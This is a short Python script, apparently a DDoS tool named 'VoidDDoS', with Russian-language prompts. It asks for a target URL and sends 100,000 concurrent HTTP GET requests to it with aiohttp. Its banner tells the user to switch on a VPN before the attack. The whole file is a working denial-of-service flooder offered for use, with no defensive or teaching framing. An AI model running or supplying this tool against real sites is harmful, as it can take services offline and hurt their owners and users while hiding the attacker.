import os
import aiohttp
import asyncio

from colorama import Fore, init
init()
os.system('cls' if os.name == 'nt' else 'clear')

banner = r"""
 _    __      _     ______  ____            
| |  / /___  (_)___/ / __ \/ __ \____  _____
| | / / __ \/ / __  / / / / / / / __ \/ ___/
| |/ / /_/ / / /_/ / /_/ / /_/ / /_/ (__  ) 
|___/\____/_/\__,_/_____/_____/\____/____/  

Включите VPN перед атакой!!!                                      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""

print(Fore.GREEN + banner)

async def fetch(session, url):
    try:
        async with session.get(url) as response:
            print(f"Статус: {response.status}")
    except Exception as e:
        print(f"Ошибка: {e}")

async def main():
    url = input("Введите url: ")
    tasks_count = 100000
    
    async with aiohttp.ClientSession() as session:
        tasks = [fetch(session, url) for _ in range(tasks_count)]
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main())